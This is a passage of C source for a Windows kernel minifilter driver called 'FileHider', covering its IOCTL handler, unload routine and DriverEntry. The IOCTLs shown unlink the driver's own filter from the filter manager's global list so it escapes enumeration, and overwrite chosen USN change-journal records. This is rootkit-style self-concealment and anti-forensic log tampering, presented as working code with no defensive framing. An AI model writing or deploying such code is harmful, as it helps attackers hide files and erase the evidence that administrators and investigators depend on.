        if (!buffer || inLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        g_HideJournal = (*(PULONG)buffer) ? TRUE : FALSE;
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_GET_HIDE_JOURNAL:
        if (!buffer || outLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        *(PULONG)buffer = g_HideJournal ? 1 : 0;
        Irp->IoStatus.Information = sizeof(ULONG);
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_RESET:
        FhResetStats();
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_HIDE_NOW:
        if (!buffer || outLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        *(PULONG)buffer = 0;
        if (g_AlreadyHidden) { status = STATUS_SUCCESS; break; }
        if (g_Filter && FhFindAndUnlinkFilterGlobal(g_Filter)) {
            g_AlreadyHidden = TRUE;
            *(PULONG)buffer = 1;
            status = STATUS_SUCCESS;
        }
        else {
            status = STATUS_NOT_FOUND;
        }
        break;

    case FH_IOCTL_SCRUB_JOURNAL:
    {
        ULONG       count;
        PULONGLONG  usns;
        ULONG       patched = 0;

        if (!buffer || inLen < sizeof(ULONGLONG)) { status = STATUS_INVALID_PARAMETER; break; }
        count = inLen / sizeof(ULONGLONG);
        if (count == 0 || count > 262144) { status = STATUS_INVALID_PARAMETER; break; }

        usns = (PULONGLONG)buffer;
        status = FhScrubJournal(usns, count, &patched);
        if (NT_SUCCESS(status)) {
            *(PULONG)buffer = patched;
            Irp->IoStatus.Information = sizeof(ULONG);
        }
        break;
    }

    default:
        break;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID
FhDriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symName;
    DbgPrint("[FileHider] FhDriverUnload\n");

    if (g_Filter) { FltUnregisterFilter(g_Filter); g_Filter = NULL; }
    FhClearRules();

    RtlInitUnicodeString(&symName, FH_SYMLINK_NAME);
    IoDeleteSymbolicLink(&symName);

    if (g_ControlDevice) { IoDeleteDevice(g_ControlDevice); g_ControlDevice = NULL; }
    UNREFERENCED_PARAMETER(DriverObject);
}

// ═════════════════════════════════════════════════════════════
//  DriverEntry
// ═════════════════════════════════════════════════════════════
NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    NTSTATUS        status;
    UNICODE_STRING  devName, symName;
    PDEVICE_OBJECT  devObj = NULL;
    LARGE_INTEGER   t;

    UNREFERENCED_PARAMETER(RegistryPath);

    InitializeListHead(&g_RuleList);
    KeInitializeSpinLock(&g_RuleLock);
    RtlZeroMemory(&g_Stats, sizeof(g_Stats));
    g_Stats.Magic = FH_STATUS_MAGIC;
    g_Stats.Version = FH_STATUS_VERSION;

    KeQuerySystemTime(&t);
    g_SessionId = (ULONGLONG)t.QuadPart;
    g_Stats.SessionId = g_SessionId;

    DbgPrint("[FileHider] DriverEntry\n");

    RtlInitUnicodeString(&devName, FH_DEVICE_NAME);
    status = IoCreateDevice(DriverObject, 0, &devName,
        FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(status)) { DbgPrint("[FileHider] IoCreateDevice 0x%X\n", status); return status; }
    g_ControlDevice = devObj;

    RtlInitUnicodeString(&symName, FH_SYMLINK_NAME);
    status = IoCreateSymbolicLink(&symName, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(devObj); g_ControlDevice = NULL; return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = FhCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = FhCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = FhDeviceControl;
    DriverObject->DriverUnload = FhDriverUnload;

    status = FltRegisterFilter(DriverObject, &FhFilterRegistration, &g_Filter);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[FileHider] FltRegisterFilter 0x%X\n", status);
        IoDeleteSymbolicLink(&symName);
        IoDeleteDevice(devObj); g_ControlDevice = NULL;
        return status;
    }

    status = FltStartFiltering(g_Filter);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[FileHider] FltStartFiltering 0x%X\n", status);
        FltUnregisterFilter(g_Filter); g_Filter = NULL;
        IoDeleteSymbolicLink(&symName);
        IoDeleteDevice(devObj); g_ControlDevice = NULL;
        return status;
    }

    g_FilterAttached = TRUE;
    DbgPrint("[FileHider] loaded\n");
    return STATUS_SUCCESS;
}